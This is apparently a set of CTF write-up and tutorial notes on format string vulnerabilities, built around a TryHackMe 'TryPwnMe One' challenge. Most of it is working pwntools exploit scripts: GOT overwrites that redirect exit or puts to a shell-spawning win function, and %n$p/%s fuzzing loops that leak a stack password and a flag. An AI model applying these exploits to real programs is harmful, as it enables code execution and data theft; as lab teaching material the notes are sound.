# Format String Exploits




## TryPwnMe One (TryHackMe) Not Specified

```c
int win(){
    system("/bin/sh\0");
}

int main(){
    setup();
    banner();
    char *username[32];
    puts("Please provide your username\n");
    read(0,username,sizeof(username));
    puts("Thanks! ");
    printf(username);
    puts("\nbye\n");
    exit(1);    
}
```
![image(1)](https://github.com/user-attachments/assets/5bb758be-86d4-421f-8918-2c988b653657)

so using ```AAAAAAAA%p.%p.%p.%p.%p.%p``` we got our input is at 6th    we can do this also other way like : 


![image](https://github.com/user-attachments/assets/ee18ad84-56a6-42a8-9215-16508b36b4d9)

```
python3 -c "print('ABCDEFGH|' + '|'.join(['%d:%%p' % i for i in range(1,40)]))" | ./notspecified | grep 4847

```

#### SOl :

 We can make use of the fmtstr_payload function of pwntools. But it is important to set the architecture and endianess first. 

 With the following script, we abuse the format string vulnerability to get a shell. It overwrites the GOT entry for the exit function with the address of the win function, so when the program tries to call exit, it instead executes the win function. It generates a payload using fmtstr_payload, which specifies the overwrite.

 In a format string vulnerability, we need to know where on the stack our input is, so we can use it to modify memory in a controlled way. In this case, index 6 is where the format string begins, so we would pass 6 as the offset to functions like fmtstr_payload in pwntools, allowing it to know where to inject the payload.

```py
from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload
from pwn import *
context.clear(arch = 'amd64', endian ='little')
def send_payload(payload):
        s.recvline()
        s.sendline(payload)
        r = s.recvline()
        return r

elf = ELF('./notspecified')

exit_got = elf.got['exit']
win_func = elf.symbols['win']

s = process('./notspecified')
#s = remote('host', port)

payload = fmtstr_payload(6, {exit_got: win_func})
print(payload)

print(send_payload(payload))
s.interactive()


```

we can do this another way by overwriting the PUTS adress 

```py
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level = "error")
context.binary = binary = ELF("./notspecified", checksec=False)

#r = remote("hOST", pORT)
r = process()

payload = fmtstr_payload(6, {binary.got["puts"] : binary.symbols["win"]})

print(b"payload : ",payload)

r.sendline(payload)
r.interactive()
r.close()

```















# ............................................................................................................

A format string vulnerability is a bug where user input is passed as the format argument to printf, scanf, or another function in that family.

The format argument has many different specifiers which could allow an attacker to leak data if they control the format argument to printf. Since printf and similar are variadic functions, they will continue popping data off of the stack according to the format.

```c
#include <stdio.h>
#include <unistd.h>

int main() {
    int secret_num = 0x8badf00d;

    char name[64] = {0};
    read(0, name, 64);
    printf("Hello ");
    printf(name);
    printf("! You'll never get my secret!\n");
    return 0;
}
```
Due to how GCC decided to lay out the stack, secret_num is actually at a lower address on the stack than name, so we only have to go to the 7th "argument" in printf to leak the secret:

```bash
$ ./fmt_string
%7$llx
Hello 8badf00d3ea43eef
! You'll never get my secret!
```

# Format Strings - Arbitrary Read 
## TYPE 1
In basic lavel we just have to leak the memory ,here is an example :

![image](https://github.com/user-attachments/assets/d07c0a0f-788b-40bb-8aa7-8e475989ae2d)

Here we are getting the same thing that we are inputing lets try %x,%p,%s,%llx to find is it a formatstring vurnabilty.
![image](https://github.com/user-attachments/assets/e1c95c23-f0de-41ee-8ed1-48af83ec08eb)
yes it is, lets leak more
```py
#!/usr/bin/python3

from pwn import *

context.log_level = 'error'

for i in range(1,50):
    io = process('./fmt_read')
    payload = f'%{i}$p'
    io.sendline(payload)
    print(io.recvall())
```
OR 
```py
from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./format_vuln', checksec=False)

# Let's fuzz 100 values
for i in range(100):
    try:
        # Create process (level used to reduce noise)
        p = process(level='error')
        # When we see the user prompt '>', format the counter
        # e.g. %2$s will attempt to print second pointer as string
        p.sendlineafter(b'> ', '%{}$s'.format(i).encode())
        # Receive the response
        result = p.recvuntil(b'> ')
        # Check for flag
        # if("flag" in str(result).lower()):
        print(str(i) + ': ' + str(result))
        # Exit the process
        p.close()
    except EOFError:
        pass
```
![image](https://github.com/user-attachments/assets/f4d233c0-3c8e-4c11-8d65-ab6f7a144efc)

And After From Hex the password is : Pa$$w0rd_1s_0n_Th3_St4ck
![image](https://github.com/user-attachments/assets/5d1d462a-8acd-4ac7-87e7-8416602aceec)


## TYPE 2
Here is a another type after the password there is another input
![image](https://github.com/user-attachments/assets/02d92cac-7c24-4bf1-b5ea-ac8facc20fa9)
Lets check
![image](https://github.com/user-attachments/assets/c5a9b899-a84d-425f-9769-dc3e1b070d82)
Yes we can do the same but now our task is to leak flag from the given address . so is short wht we have to do is we have to find the offset and put the flag address to leak the flag .

![image](https://github.com/user-attachments/assets/0797952a-ee32-45f0-abf6-6146fd4d3823)

```py
#!/usr/bin/python3

from pwn import *

context.log_level = 'error'

for i in range(1,50):
    io = process('./fmt_read')
    io.sendline('Pa$$w0rd_1s_0n_Th3_St4ck')
    payload = f'AAAAAAAA.%{i}$p'
    io.sendline(payload)
    print(io.recvall(),i)
    io.close()
```
Here 16 is our offset.So lets find the flag.
![image](https://github.com/user-attachments/assets/ba9ecc61-46cf-427a-b3d3-1923529208ca)
Here we go 
```py
#!/usr/bin/python3

from pwn import *

context.log_level = 'error'


io = process('./fmt_read')
io.sendline('Pa$$w0rd_1s_0n_Th3_St4ck')
payload = b'%17$sAAA' + p64(0x404080)
io.sendline(payload)
io.interactive()


# nm ./fmt_read  fr address
```
